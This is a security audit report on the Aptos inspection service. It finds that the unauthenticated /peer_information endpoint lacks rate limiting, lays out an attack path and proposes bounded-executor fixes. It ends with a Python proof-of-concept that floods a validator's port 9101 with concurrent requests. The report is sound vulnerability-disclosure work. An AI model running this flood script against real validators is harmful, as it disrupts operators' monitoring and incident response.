# Audit Report

## Title
Inspection Service Denial of Service via Unbounded Peer Information Requests

## Summary
The `/peer_information` endpoint in the Aptos inspection service lacks rate limiting and concurrency controls, allowing attackers to exhaust the service's runtime threads through repeated expensive requests. This can render monitoring endpoints unresponsive, potentially masking actual validator health issues from operational monitoring systems.

## Finding Description

The inspection service endpoint handler for `/peer_information` performs extensive data gathering operations without any rate limiting or concurrency control mechanisms. [1](#0-0) 

The `handle_peer_information_request` function calls `get_peer_information` which performs multiple expensive operations: [2](#0-1) 

This function iterates over all connected peers multiple times (6-7 iterations through different display functions), performing operations including:
- Fetching metadata for each peer
- JSON serialization of connection metadata
- Debug formatting of detailed peer states
- String concatenation and formatting

The inspection service configuration provides no rate limiting capabilities: [3](#0-2) 

The service runs on its own runtime with a limited thread pool: [4](#0-3) [5](#0-4) 

Unlike the peer-monitoring-service which implements concurrency controls with `BoundedExecutor`: [6](#0-5) 

The inspection service has no such protection. An attacker can send numerous concurrent HTTP GET requests to `http://<validator>:9101/peer_information`, causing all runtime worker threads to become occupied processing these expensive operations. This blocks other critical monitoring endpoints like `/metrics` and `/consensus_health_check` from responding, as they share the same runtime.

**Attack Path:**
1. Attacker identifies an accessible inspection service endpoint (port 9101 by default, often accessible within cloud networks)
2. Attacker sends 100+ concurrent HTTP GET requests to `/peer_information`
3. Each request iterates through all peers (potentially 100-1000 in production networks), performing expensive operations
4. The limited runtime threads (typically equal to CPU cores, e.g., 8-16) become saturated
5. Prometheus scrapers attempting to access `/metrics` timeout
6. Monitoring systems report the validator as unhealthy or unresponsive
7. Operators cannot distinguish between genuine validator issues and inspection service overload

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program criteria. While it does not directly affect consensus, transaction processing, or funds, it creates operational blind spots that can mask actual validator issues.

The impact includes:
- **Monitoring System Disruption**: Prometheus and other monitoring tools cannot scrape metrics, leading to false alerts or masking real problems
- **Operational Visibility Loss**: Operators lose visibility into validator health during attacks
- **Incident Response Delays**: Real validator issues may go undetected while operators investigate false alarms

This aligns with Medium severity as it creates "state inconsistencies requiring intervention" at the operational level, though it doesn't directly compromise blockchain security.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack requires:
- Network access to port 9101 (inspection service)
- No authentication (the endpoint is unauthenticated)
- Minimal technical sophistication (simple HTTP requests)

The endpoint is enabled by default: [7](#0-6) 

While production deployments should protect this port with firewall rules, misconfigurations are common, and the service may be accessible from:
- Internal cloud networks
- VPNs with overly broad access
- Misconfigured security groups
- Development/testnet environments

The absence of authentication makes exploitation trivial once network access is obtained.

## Recommendation

Implement rate limiting and concurrency controls for the inspection service, similar to the peer-monitoring-service pattern:

**1. Add rate limiting configuration:**
```rust
// In config/src/config/inspection_service_config.rs
pub struct InspectionServiceConfig {
    pub address: String,
    pub port: u16,
    pub expose_configuration: bool,
    pub expose_identity_information: bool,
    pub expose_peer_information: bool,
    pub expose_system_information: bool,
    pub max_concurrent_requests: u16,  // Add this field
}

impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            // ... existing fields ...
            max_concurrent_requests: 10,  // Reasonable default
        }
    }
}
```

**2. Implement bounded executor in the inspection service:**
```rust
// In crates/aptos-inspection-service/src/server/mod.rs
use aptos_bounded_executor::BoundedExecutor;

pub fn start_inspection_service(
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) {
    let runtime = aptos_runtimes::spawn_named_runtime("inspection".into(), None);
    let bounded_executor = BoundedExecutor::new(
        node_config.inspection_service.max_concurrent_requests as usize,
        runtime.handle().clone(),
    );
    
    // Use bounded_executor to limit concurrent request processing
    // Implement request queuing with timeouts
}
```

**3. Add per-endpoint request counting:**
Implement metrics to track concurrent requests per endpoint and reject requests when limits are exceeded, returning HTTP 429 (Too Many Requests).

**4. Consider implementing authentication** for sensitive endpoints, even if behind firewalls, following defense-in-depth principles.

## Proof of Concept

**Python script to demonstrate the attack:**

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import time

async def spam_peer_info(session, url, request_id):
    try:
        start = time.time()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as response:
            await response.text()
            elapsed = time.time() - start
            print(f"Request {request_id}: Status {response.status}, Time {elapsed:.2f}s")
    except asyncio.TimeoutError:
        print(f"Request {request_id}: TIMEOUT")
    except Exception as e:
        print(f"Request {request_id}: ERROR {e}")

async def attack(target_host, num_requests=100):
    peer_info_url = f"http://{target_host}:9101/peer_information"
    metrics_url = f"http://{target_host}:9101/metrics"
    
    # Launch concurrent attacks on peer_information
    async with aiohttp.ClientSession() as session:
        print(f"Launching {num_requests} concurrent requests to /peer_information...")
        tasks = [spam_peer_info(session, peer_info_url, i) for i in range(num_requests)]
        
        # Try to access metrics endpoint during attack
        await asyncio.sleep(1)
        print("\nAttempting to access /metrics during attack...")
        try:
            start = time.time()
            async with session.get(metrics_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                elapsed = time.time() - start
                print(f"Metrics endpoint: Status {resp.status}, Time {elapsed:.2f}s")
        except asyncio.TimeoutError:
            print("Metrics endpoint: TIMEOUT - Monitoring unavailable!")
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 poc.py <validator-host>")
        sys.exit(1)
    
    asyncio.run(attack(sys.argv[1]))
```

**Expected behavior:** After launching 100+ concurrent requests, subsequent requests to `/metrics` will timeout or experience significant delays, demonstrating the monitoring disruption.

## Notes

While the inspection service runs in a separate runtime from the main validator process, the operational impact of losing monitoring visibility is significant. The vulnerability is particularly concerning because:

1. **Default Configuration**: The endpoint is enabled by default and lacks protective measures
2. **Monitoring Dependency**: Operational monitoring systems (Prometheus) share the same service endpoints
3. **No Alerting on Attack**: There are no built-in mechanisms to detect or alert on this type of resource exhaustion
4. **Cascading Effects**: False alarms may trigger automated responses or waste operator time during actual incidents

The fix should implement defense-in-depth by adding both rate limiting and concurrency controls, following the pattern already established in other Aptos services like peer-monitoring-service.

### Citations

**File:** crates/aptos-inspection-service/src/server/mod.rs (L72-72)
```rust
    let runtime = aptos_runtimes::spawn_named_runtime("inspection".into(), None);
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L147-155)
```rust
        PEER_INFORMATION_PATH => {
            // /peer_information
            // Exposes the peer information
            peer_information::handle_peer_information_request(
                &node_config,
                aptos_data_client,
                peers_and_metadata,
            )
        },
```

**File:** crates/aptos-inspection-service/src/server/peer_information.rs (L41-106)
```rust
fn get_peer_information(
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> String {
    // Get all registered networks
    let registered_networks: Vec<NetworkId> =
        peers_and_metadata.get_registered_networks().collect();

    // Get all peers (sorted by peer ID)
    let mut all_peers = peers_and_metadata.get_all_peers();
    all_peers.sort();

    // Display a summary of all peers and networks
    let mut peer_information_output = Vec::<String>::new();
    display_peer_information_summary(
        &mut peer_information_output,
        &all_peers,
        &registered_networks,
    );
    peer_information_output.push("\n".into());

    // Display connection metadata for each peer
    display_peer_connection_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the entire set of trusted peers
    display_trusted_peers(
        &mut peer_information_output,
        registered_networks,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display basic peer metadata for each peer
    display_peer_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display state sync metadata for each peer
    display_state_sync_metadata(&mut peer_information_output, &all_peers, aptos_data_client);
    peer_information_output.push("\n".into());

    // Display detailed peer metadata for each peer
    display_detailed_monitoring_metadata(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );
    peer_information_output.push("\n".into());

    // Display the internal client state for each peer
    display_internal_client_state(
        &mut peer_information_output,
        &all_peers,
        peers_and_metadata.deref(),
    );

    peer_information_output.join("\n") // Separate each entry with a newline to construct the output
}
```

**File:** config/src/config/inspection_service_config.rs (L15-24)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct InspectionServiceConfig {
    pub address: String,
    pub port: u16,
    pub expose_configuration: bool,
    pub expose_identity_information: bool,
    pub expose_peer_information: bool,
    pub expose_system_information: bool,
}
```

**File:** config/src/config/inspection_service_config.rs (L32-33)
```rust
            expose_identity_information: true,
            expose_peer_information: true,
```

**File:** crates/aptos-runtimes/src/lib.rs (L40-54)
```rust
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
    if let Some(num_worker_threads) = num_worker_threads {
        builder.worker_threads(num_worker_threads);
    }
```

**File:** peer-monitoring-service/server/src/lib.rs (L66-69)
```rust
        let bounded_executor = BoundedExecutor::new(
            node_config.peer_monitoring_service.max_concurrent_requests as usize,
            executor,
        );
```
